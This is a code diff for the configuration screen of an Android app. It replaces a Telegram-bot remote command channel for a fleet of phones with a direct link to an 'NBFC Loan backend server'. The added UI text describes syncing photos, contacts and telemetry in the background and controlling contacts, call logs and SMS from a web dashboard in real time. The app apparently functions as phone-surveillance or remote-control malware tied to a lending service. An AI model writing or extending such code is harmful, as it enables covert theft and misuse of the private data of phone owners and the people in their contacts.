@@ -1,5 +1,6 @@
 package com.example.ui.screens
 
+import android.os.Build
 import androidx.compose.animation.AnimatedVisibility
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.Arrangement
@@ -15,17 +16,13 @@ import androidx.compose.foundation.layout.size
 import androidx.compose.foundation.layout.width
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.RoundedCornerShape
-import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.Check
 import androidx.compose.material.icons.filled.Info
-import androidx.compose.material.icons.filled.Lock
 import androidx.compose.material.icons.filled.NetworkCheck
+import androidx.compose.material.icons.filled.PhoneAndroid
 import androidx.compose.material.icons.filled.Save
-import androidx.compose.material.icons.filled.Security
-import androidx.compose.material.icons.filled.Visibility
-import androidx.compose.material.icons.filled.VisibilityOff
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.Card
@@ -33,7 +30,6 @@ import androidx.compose.material3.CardDefaults
 import androidx.compose.material3.CircularProgressIndicator
 import androidx.compose.material3.FilledTonalButton
 import androidx.compose.material3.Icon
-import androidx.compose.material3.IconButton
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.OutlinedTextFieldDefaults
@@ -46,11 +42,7 @@ import androidx.compose.runtime.remember
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
-import androidx.compose.ui.platform.testTag
 import androidx.compose.ui.text.font.FontWeight
-import androidx.compose.ui.text.input.KeyboardType
-import androidx.compose.ui.text.input.PasswordVisualTransformation
-import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import com.example.ui.MainViewModel
@@ -65,12 +57,12 @@ fun BotConfigScreen(
     val currentConfig by viewModel.botConfig.collectAsState()
     val testState by viewModel.botTestState.collectAsState()
 
-    var tokenInput by remember(currentConfig.botToken) { mutableStateOf(currentConfig.botToken) }
-    var userIdInput by remember(currentConfig.authorizedUserId) {
-        mutableStateOf(if (currentConfig.authorizedUserId != 0L) currentConfig.authorizedUserId.toString() else "")
+    var serverUrlInput by remember(currentConfig.serverUrl) {
+        mutableStateOf(currentConfig.serverUrl.ifBlank { "http://localhost:5000" })
     }
-    var relayUrlInput by remember(currentConfig.relayUrl) { mutableStateOf(currentConfig.relayUrl) }
-    var isTokenVisible by remember { mutableStateOf(false) }
+    var deviceIdInput by remember(currentConfig.deviceId) {
+        mutableStateOf(currentConfig.deviceId)
+    }
     var saveSuccessMessage by remember { mutableStateOf(false) }
 
     val scrollState = rememberScrollState()
@@ -82,10 +74,10 @@ fun BotConfigScreen(
             .padding(16.dp),
         verticalArrangement = Arrangement.spacedBy(16.dp)
     ) {
-        // Security Banner
+        // Direct Server Connection Banner
         Card(
             colors = CardDefaults.cardColors(
-                containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
+                containerColor = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.4f)
             ),
             shape = RoundedCornerShape(16.dp),
             modifier = Modifier.fillMaxWidth()
@@ -102,19 +94,19 @@ fun BotConfigScreen(
                     contentAlignment = Alignment.Center
                 ) {
                     Icon(
-                        Icons.Default.Security,
+                        Icons.Default.NetworkCheck,
                         contentDescription = null,
                         tint = MaterialTheme.colorScheme.primary
                     )
                 }
                 Column {
                     Text(
-                        text = "Hardware-Backed Keystore",
+                        text = "Direct Dashboard Fleet Control",
                         style = MaterialTheme.typography.titleSmall,
                         fontWeight = FontWeight.Bold
                     )
                     Text(
-                        text = "Credentials are encrypted using AES-256-GCM backed by Android KeyStore. Only your authorized User ID can issue commands.",
+                        text = "Phone communicates directly with the NBFC Loan backend server. Photos, contacts, and telemetry are synchronized with your web dashboard.",
                         style = MaterialTheme.typography.bodySmall,
                         color = MaterialTheme.colorScheme.onSurfaceVariant
                     )
@@ -122,7 +114,7 @@ fun BotConfigScreen(
             }
         }
 
-        // Input Form Card
+        // Primary: Backend Server Connection Card
         Card(
             colors = CardDefaults.cardColors(
                 containerColor = MaterialTheme.colorScheme.surface
@@ -135,121 +127,25 @@ fun BotConfigScreen(
                 verticalArrangement = Arrangement.spacedBy(14.dp)
             ) {
                 Text(
-                    text = "Telegram Bot Credentials",
+                    text = "Server & Fleet Configuration",
                     style = MaterialTheme.typography.titleMedium,
                     fontWeight = FontWeight.Bold
                 )
 
-                // Bot Token
+                // Server URL
                 OutlinedTextField(
-                    value = tokenInput,
+                    value = serverUrlInput,
                     onValueChange = {
-                        tokenInput = it
+                        serverUrlInput = it
                         saveSuccessMessage = false
                     },
-                    label = { Text("Telegram Bot Token") },
-                    placeholder = { Text("123456789:ABCdefGhIJKlmNoPQRstuVWXyz") },
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .testTag("bot_token_input"),
-                    visualTransformation = if (isTokenVisible) VisualTransformation.None else PasswordVisualTransformation(),
-                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
-                    trailingIcon = {
-                        IconButton(onClick = { isTokenVisible = !isTokenVisible }) {
-                            Icon(
-                                imageVector = if (isTokenVisible) Icons.Default.VisibilityOff else Icons.Default.Visibility,
-                                contentDescription = "Toggle token visibility"
-                            )
-                        }
-                    },
-                    shape = RoundedCornerShape(12.dp),
-                    colors = OutlinedTextFieldDefaults.colors(
-                        focusedBorderColor = MaterialTheme.colorScheme.primary
-                    )
-                )
-
-                // User ID
-                OutlinedTextField(
-                    value = userIdInput,
-                    onValueChange = {
-                        userIdInput = it.filter { char -> char.isDigit() }
-                        saveSuccessMessage = false
-                    },
-                    label = { Text("Authorized Telegram User ID") },
-                    placeholder = { Text("e.g. 987654321") },
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .testTag("user_id_input"),
-                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
-                    supportingText = {
-                        Text(
-                            text = "Only this numerical Telegram ID will be allowed to issue commands. All others are blocked.",
-                            style = MaterialTheme.typography.bodySmall
-                        )
-                    },
-                    shape = RoundedCornerShape(12.dp),
-                    colors = OutlinedTextFieldDefaults.colors(
-                        focusedBorderColor = MaterialTheme.colorScheme.primary
-                    )
-                )
-
-                // Device ID (Auto-Generated Unique Hardware Identity)
-                Card(
-                    colors = CardDefaults.cardColors(
-                        containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
-                    ),
-                    shape = RoundedCornerShape(12.dp),
-                    modifier = Modifier.fillMaxWidth()
-                ) {
-                    Column(
-                        modifier = Modifier.padding(14.dp),
-                        verticalArrangement = Arrangement.spacedBy(4.dp)
-                    ) {
-                        Row(
-                            verticalAlignment = Alignment.CenterVertically,
-                            horizontalArrangement = Arrangement.spacedBy(6.dp)
-                        ) {
-                            Icon(
-                                imageVector = Icons.Default.Info,
-                                contentDescription = null,
-                                tint = MaterialTheme.colorScheme.primary,
-                                modifier = Modifier.size(16.dp)
-                            )
-                            Text(
-                                text = "Device ID (Auto-Generated from Model)",
-                                style = MaterialTheme.typography.labelMedium,
-                                fontWeight = FontWeight.SemiBold,
-                                color = MaterialTheme.colorScheme.primary
-                            )
-                        }
-                        Text(
-                            text = currentConfig.deviceId.ifBlank { "Auto-detecting..." },
-                            style = MaterialTheme.typography.titleMedium,
-                            fontWeight = FontWeight.Bold,
-                            color = MaterialTheme.colorScheme.onSurface
-                        )
-                        Text(
-                            text = "Auto-assigned uniquely to this phone model. In Telegram, use:\n/cmd ${currentConfig.deviceId.ifBlank { "<id>" }} <command> or /cmd all <command>",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-                    }
-                }
-
-                // Relay Webhook URL (Optional for Multi-Device)
-                OutlinedTextField(
-                    value = relayUrlInput,
-                    onValueChange = {
-                        relayUrlInput = it
-                        saveSuccessMessage = false
-                    },
-                    label = { Text("Relay URL (Google Apps Script / Webhook)") },
-                    placeholder = { Text("https://script.google.com/macros/s/.../exec") },
+                    label = { Text("Dashboard Server URL") },
+                    placeholder = { Text("http://localhost:5000 or http://192.168.1.x:5000") },
                     modifier = Modifier.fillMaxWidth(),
                     singleLine = true,
                     supportingText = {
                         Text(
-                            text = "Optional: Paste Google Apps Script Web App URL to manage multiple phones simultaneously.",
+                            text = "URL of your Node.js backend. Use http://localhost:5000 with ADB reverse or your local LAN IP.",
                             style = MaterialTheme.typography.bodySmall
                         )
                     },
@@ -259,17 +155,38 @@ fun BotConfigScreen(
                     )
                 )
 
-                // Buttons: Test Connection & Save
+                // Device ID
+                OutlinedTextField(
+                    value = deviceIdInput,
+                    onValueChange = {
+                        deviceIdInput = it
+                        saveSuccessMessage = false
+                    },
+                    label = { Text("Device ID") },
+                    placeholder = { Text("e.g. samsung_sme156b_abad") },
+                    modifier = Modifier.fillMaxWidth(),
+                    singleLine = true,
+                    supportingText = {
+                        Text(
+                            text = "Unique identifier assigned to this handset on the Admin Web Dashboard.",
+                            style = MaterialTheme.typography.bodySmall
+                        )
+                    },
+                    shape = RoundedCornerShape(12.dp),
+                    colors = OutlinedTextFieldDefaults.colors(
+                        focusedBorderColor = MaterialTheme.colorScheme.primary
+                    )
+                )
+
+                // Action Buttons: Test Connection & Save
                 Row(
                     modifier = Modifier.fillMaxWidth(),
                     horizontalArrangement = Arrangement.spacedBy(10.dp)
                 ) {
                     FilledTonalButton(
-                        onClick = { viewModel.testBotConnection(tokenInput) },
-                        enabled = tokenInput.isNotBlank() && !testState.isLoading,
-                        modifier = Modifier
-                            .weight(1f)
-                            .testTag("test_bot_connection_button")
+                        onClick = { viewModel.testServerConnection(serverUrlInput, deviceIdInput) },
+                        enabled = serverUrlInput.isNotBlank() && !testState.isLoading,
+                        modifier = Modifier.weight(1f)
                     ) {
                         if (testState.isLoading) {
                             CircularProgressIndicator(
@@ -281,27 +198,24 @@ fun BotConfigScreen(
                         } else {
                             Icon(Icons.Default.NetworkCheck, contentDescription = null, modifier = Modifier.size(18.dp))
                             Spacer(modifier = Modifier.width(6.dp))
-                            Text("Test Bot")
+                            Text("Test")
                         }
                     }
 
                     Button(
                         onClick = {
-                            val id = userIdInput.toLongOrNull() ?: 0L
-                            viewModel.saveCredentials(tokenInput, id, testState.botUsername, currentConfig.deviceId, relayUrlInput)
+                            viewModel.saveServerConfiguration(serverUrlInput, deviceIdInput)
                             saveSuccessMessage = true
                         },
-                        enabled = tokenInput.isNotBlank() && userIdInput.isNotBlank(),
-                        modifier = Modifier
-                            .weight(1f)
-                            .testTag("save_credentials_button"),
+                        enabled = serverUrlInput.isNotBlank(),
+                        modifier = Modifier.weight(1.2f),
                         colors = ButtonDefaults.buttonColors(
                             containerColor = MaterialTheme.colorScheme.primary
                         )
                     ) {
                         Icon(Icons.Default.Save, contentDescription = null, modifier = Modifier.size(18.dp))
                         Spacer(modifier = Modifier.width(6.dp))
-                        Text("Save")
+                        Text("Save Settings")
                     }
                 }
 
@@ -323,7 +237,7 @@ fun BotConfigScreen(
                     ) {
                         Icon(Icons.Default.Check, contentDescription = null, tint = StatusGreen, modifier = Modifier.size(16.dp))
                         Text(
-                            text = "Credentials saved securely to KeyStore!",
+                            text = "Fleet settings saved securely!",
                             color = StatusGreen,
                             style = MaterialTheme.typography.bodySmall,
                             fontWeight = FontWeight.Bold
@@ -333,7 +247,54 @@ fun BotConfigScreen(
             }
         }
 
-        // Setup Guide Card
+        // Hardware Identity Card
+        Card(
+            colors = CardDefaults.cardColors(
+                containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
+            ),
+            shape = RoundedCornerShape(16.dp),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(
+                modifier = Modifier.padding(16.dp),
+                verticalArrangement = Arrangement.spacedBy(8.dp)
+            ) {
+                Row(
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    Icon(
+                        imageVector = Icons.Default.PhoneAndroid,
+                        contentDescription = null,
+                        tint = MaterialTheme.colorScheme.primary,
+                        modifier = Modifier.size(18.dp)
+                    )
+                    Text(
+                        text = "Device Hardware Identity",
+                        style = MaterialTheme.typography.labelMedium,
+                        fontWeight = FontWeight.SemiBold,
+                        color = MaterialTheme.colorScheme.primary
+                    )
+                }
+                Text(
+                    text = "Hardware Model: ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}",
+                    style = MaterialTheme.typography.bodyMedium,
+                    fontWeight = FontWeight.Medium
+                )
+                Text(
+                    text = "Android OS: Version ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+                Text(
+                    text = "Assigned Device ID: ${currentConfig.deviceId.ifBlank { "Auto-detecting..." }}",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+            }
+        }
+
+        // Instructions Card
         Card(
             colors = CardDefaults.cardColors(
                 containerColor = MaterialTheme.colorScheme.surface
@@ -351,33 +312,23 @@ fun BotConfigScreen(
                 ) {
                     Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
                     Text(
-                        text = "Setup Instructions",
+                        text = "Fleet Setup Instructions",
                         style = MaterialTheme.typography.titleMedium,
                         fontWeight = FontWeight.Bold
                     )
                 }
 
                 Text(
-                    text = "1. Create your Telegram Bot:\n" +
-                            "   • Open Telegram and search for @BotFather\n" +
-                            "   • Send /newbot and choose a name & username\n" +
-                            "   • Copy the HTTP API token into the field above.",
-                    style = MaterialTheme.typography.bodySmall
-                )
-
-                Text(
-                    text = "2. Find your Telegram User ID:\n" +
-                            "   • Search for @userinfobot or @raw_data_bot on Telegram\n" +
-                            "   • Send /start — it will reply with your numerical Id\n" +
-                            "   • Copy your ID into the 'Authorized User ID' field.",
-                    style = MaterialTheme.typography.bodySmall
-                )
-
-                Text(
-                    text = "3. Verify & Start:\n" +
-                            "   • Tap 'Test Bot' then 'Save'\n" +
-                            "   • Return to the dashboard and start the Remote Service.",
-                    style = MaterialTheme.typography.bodySmall
+                    text = "1. Enter your Backend Server URL:\n" +
+                            "   • Local testing: http://localhost:5000 (run `adb reverse tcp:5000 tcp:5000`)\n" +
+                            "   • LAN/Wi-Fi: http://<your-computer-ip>:5000\n" +
+                            "   • Cloud: https://api.yourdomain.com\n\n" +
+                            "2. Tap 'Test' to verify connectivity, then tap 'Save Settings'.\n\n" +
+                            "3. Return to the Dashboard screen and tap 'Start' to begin background telemetry.\n\n" +
+                            "4. On the Web Dashboard, go to 'Phone Control' to manage contacts, photos, call logs, and SMS directly in real time.",
+                    style = MaterialTheme.typography.bodySmall,
+                    lineHeight = 20.sp,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
                 )
             }
         }
